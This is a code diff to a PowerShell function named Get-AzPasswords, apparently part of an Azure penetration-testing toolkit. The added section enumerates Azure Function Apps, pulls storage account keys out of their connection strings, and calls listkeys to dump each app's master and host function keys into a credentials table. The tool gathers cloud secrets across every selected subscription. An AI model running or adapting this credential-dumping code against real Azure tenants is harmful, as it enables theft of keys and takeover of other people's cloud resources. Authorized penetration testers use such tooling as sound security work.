@@ -102,6 +102,11 @@ Function Get-AzPasswords
         HelpMessage="Dump AKS clusterAdmin and clusterUser kubeconfig files.")]
         [ValidateSet("Y","N")]
         [String]$AKS = "Y",
+        
+        [parameter(Mandatory=$false,
+        HelpMessage="Dump Function App Access Keys and Storage Account Keys.")]
+        [ValidateSet("Y","N")]
+        [String]$FunctionApps = "Y",
 
         [parameter(Mandatory=$false,
         HelpMessage="Export the AKS kubeconfigs to local files.")]
@@ -138,7 +143,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS}
         break
     }
 
@@ -986,6 +991,34 @@ Function Get-AzPasswords
 
         }
 
+    }
+
+    if ($FunctionApps -eq 'Y'){
+        # Function Apps Section
+        Write-Verbose "Getting List of Azure Function Apps..."
+        $functApps = Get-AzFunctionApp
+        
+        if($functApps -ne $null){
+            $functApps | ForEach-Object {
+                
+                $functAppName = $_.Name
+
+                Write-Verbose "`tGetting Function keys from the $functAppName application"
+                # Extract Storage Account Key
+                $appSettings = ($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING).Split(";")
+                $TempTblCreds.Rows.Add("Function App Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+
+                # Request the Function Keys
+                $functKeys = $_ | Invoke-AzResourceAction -Action host/default/listkeys -Force
+                $TempTblCreds.Rows.Add("Function App Master Key",$_.Name,"master",$functKeys.masterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                
+                $keyMembers = ($functKeys.functionKeys | get-member | where MemberType -EQ "NoteProperty")
+                
+                $keyMembers | ForEach-Object{
+                    $TempTblCreds.Rows.Add("Function App Host Key",$functAppName,$_.Name,(($_.Definition) -replace "String ") -replace (-join($_.Name,"=")),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                }
+            }
+        }
     }
 
     Write-Verbose "Password Dumping Activities Have Completed"
